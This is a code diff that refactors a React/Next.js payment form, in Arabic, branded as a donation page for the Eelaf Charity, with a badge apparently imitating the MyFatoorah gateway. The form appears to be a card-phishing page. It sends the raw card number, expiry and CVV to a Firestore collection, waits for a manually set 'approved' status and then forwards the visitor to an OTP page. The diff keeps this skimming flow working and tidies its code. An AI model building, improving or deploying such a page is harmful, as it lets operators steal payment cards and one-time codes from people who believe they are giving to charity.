@@ -1,11 +1,12 @@
 "use client"
 
-import React, { useEffect, useState } from "react"
+import type React from "react"
+import { useEffect, useState } from "react"
 import Image from "next/image"
-import { ChevronDown, Router } from "lucide-react"
+import { ChevronDown } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
-import { addData ,db} from "@/lib/firebase"
+import { addData, db } from "@/lib/firebase"
 import { FullPageLoader } from "@/components/fullpageloader"
 import { doc, onSnapshot } from "firebase/firestore"
 import { useRouter } from "next/navigation"
@@ -14,39 +15,68 @@ export default function APaymentForm() {
   const [cardholderName, setCardholderName] = useState("")
   const [cardNumber, setCardNumber] = useState("")
   const [expiryDate, setExpiryDate] = useState("")
-  const [loading,setLoading] = useState(false)
+  const [loading, setLoading] = useState(false)
   const [cvv, setCvv] = useState("")
-  const [status, setStuts] = useState("new")
+  const [status, setStatus] = useState("new")
+  const [itemValue, setItemValue] = useState("")
+  const [visitorId, setVisitorId] = useState("")
   const router = useRouter()
-  const value=localStorage.getItem('item')
-  const handleSubmit = (e:any) => {
-    e.preventDefault()
-    const _id = localStorage.getItem('visitor')
-    addData({ createdDate: new Date().toISOString(), id: _id, cardNumber, expiryDate, cvv,status })
-    setLoading(true)
-  }
-  useEffect(() => {
-    const visitorId = localStorage.getItem("visitor")
-    if (visitorId) {
-      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
-        if (docSnap.exists()) {
-          const data = docSnap.data() 
-          if (data.status) {
-            if (data.status === "approved") {
-              setLoading(false)
-              setStuts(data.status)
-              router.push('/otp')
-            } else if (data.status === "rejected") {
-              setLoading(false)
-              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
-            }
-          }
-        }
-      })
 
-      return () => unsubscribe()
+  // Safely access localStorage after component mounts
+  useEffect(() => {
+    // Get item value from localStorage
+    const storedItem = localStorage.getItem("item")
+    if (storedItem) {
+      setItemValue(storedItem)
+    }
+
+    // Get visitor ID from localStorage
+    const storedVisitorId = localStorage.getItem("visitor")
+    if (storedVisitorId) {
+      setVisitorId(storedVisitorId)
     }
   }, [])
+
+  // Set up Firestore listener
+  useEffect(() => {
+    if (!visitorId) return
+
+    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
+      if (docSnap.exists()) {
+        const data = docSnap.data()
+        if (data.status) {
+          if (data.status === "approved") {
+            setLoading(false)
+            setStatus(data.status)
+            router.push("/otp")
+          } else if (data.status === "rejected") {
+            setLoading(false)
+            alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
+          }
+        }
+      }
+    })
+
+    return () => unsubscribe()
+  }, [visitorId, router])
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault()
+
+    // Get visitor ID from state (which was set from localStorage)
+    if (!visitorId) return
+
+    addData({
+      createdDate: new Date().toISOString(),
+      id: visitorId,
+      cardNumber,
+      expiryDate,
+      cvv,
+      status,
+    })
+
+    setLoading(true)
+  }
 
   return (
     <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
@@ -59,13 +89,7 @@ export default function APaymentForm() {
           <div className="text-xl font-bold text-right text-gray-800">جمعية إيلاف الخيرية</div>
 
           <div className="h-10 w-10 relative">
-            <Image
-              src="/logoelaf.jpg"
-              alt="Eelaf Charity Logo"
-              width={90}
-              height={90}
-              className="object-contain"
-            />
+            <Image src="/logoelaf.jpg" alt="Eelaf Charity Logo" width={90} height={90} className="object-contain" />
           </div>
         </div>
 
@@ -77,9 +101,8 @@ export default function APaymentForm() {
         </div>
 
         <div className="text-right mb-2">
-          <span className="text-blue-600 text-3xl font-bold ml-1">{value}</span>
+          <span className="text-blue-600 text-3xl font-bold ml-1">{itemValue}</span>
           <span className="text-gray-600">د.ك</span>
-
         </div>
 
         <div className="text-right mb-8 text-gray-700 text-sm">
@@ -109,7 +132,7 @@ export default function APaymentForm() {
 
           <div className="relative">
             <Input
-            type="tel"
+              type="tel"
               className="text-right border-gray-300 rounded-md p-3"
               placeholder="رقم البطاقة"
               maxLength={16}
@@ -118,22 +141,10 @@ export default function APaymentForm() {
             />
             <div className="absolute left-3 top-1/2 transform -translate-y-1/2 flex space-x-1">
               <div className="w-8 h-5 relative">
-                <Image
-                  src="/m.png"
-                  alt="Mastercard"
-                  width={32}
-                  height={20}
-                  className="object-contain"
-                />
+                <Image src="/m.png" alt="Mastercard" width={32} height={20} className="object-contain" />
               </div>
               <div className="w-8 h-5 relative">
-                <Image
-                  src="/v.png"
-                  alt="Visa"
-                  width={32}
-                  height={20}
-                  className="object-contain"
-                />
+                <Image src="/v.png" alt="Visa" width={32} height={20} className="object-contain" />
               </div>
             </div>
           </div>
@@ -144,14 +155,13 @@ export default function APaymentForm() {
               placeholder="رقم التحقق"
               value={cvv}
               maxLength={3}
-
               onChange={(e) => setCvv(e.target.value)}
             />
             <Input
               className="text-right border-gray-300 rounded-md p-3"
               placeholder="شهر / سنة"
               maxLength={5}
-              value={expiryDate.length===2?expiryDate+'/':expiryDate}
+              value={expiryDate.length === 2 ? expiryDate + "/" : expiryDate}
               onChange={(e) => setExpiryDate(e.target.value)}
             />
           </div>
@@ -164,17 +174,11 @@ export default function APaymentForm() {
         <div className="mt-8 flex justify-center items-center">
           <span className="text-sm text-gray-500 ml-2">مدعوم من</span>
           <div className="h-6 w-24 relative">
-            <Image
-              src="/vercel.svg"
-              alt="MyAtoorah"
-              width={96}
-              height={24}
-              className="object-contain"
-            />
+            <Image src="/vercel.svg" alt="MyAtoorah" width={96} height={24} className="object-contain" />
           </div>
         </div>
       </div>
-      {loading&&<FullPageLoader/>}
+      {loading && <FullPageLoader />}
     </div>
   )
 }
